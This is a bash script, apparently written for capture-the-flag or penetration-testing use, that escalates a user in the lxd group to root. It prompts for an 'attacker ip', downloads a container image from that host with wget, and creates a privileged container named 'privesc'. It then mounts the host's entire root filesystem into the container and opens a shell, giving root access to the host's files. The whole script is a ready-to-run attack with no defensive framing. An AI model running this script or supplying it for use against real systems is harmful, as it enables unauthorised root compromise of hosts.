#!/bin/bash

read -p "What is your attacker ip?: " ip
read -p "What is your port?: " port

wget http://$ip:$port/incus.tar.xz
wget http://$ip:$port/rootfs.squashfs

lxc image import incus.tar.xz rootfs.squashfs --alias alpine

#Check the image is there:
lxc image list

# Function to create a storage pool if none exists
create_storage_pool() {
    echo "No storage pool found. Creating a default storage pool..."
    lxc storage create default dir
}

# Function to initialize the container with specified parameters
initialize_container() {
    local image="$1"
    local container_name="$2"

    # Run the init command with --storage default
    echo "Initializing container $container_name with storage pool 'default'..."
    lxc init "$image" "$container_name" -c security.privileged=true --storage default
}

# Check if the storage pool exists
if ! lxc storage list | grep -q "^| default "; then
    create_storage_pool
fi

# Attempt to initialize the container
image="alpine"
container_name="privesc"

# Capture output and error in a variable
output=$(lxc init "$image" "$container_name" -c security.privileged=true 2>&1)

# Check if the specific error is in the output
if echo "$output" | grep -q "No root device could be found"; then
    echo "Error: No root device could be found. Retrying with explicit storage..."
    create_storage_pool
    initialize_container "$image" "$container_name"
else
    echo "$output"
    echo "======== Container initialized successfully ========"
fi

#List containers:
lxc list

#Set up privesc:
echo ""
echo "======== starting priv esc ========"
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

#Execute privesc:
lxc start privesc
lxc exec privesc /bin/sh

echo ""
echo "======== go to /mnt/root ========"
echo ""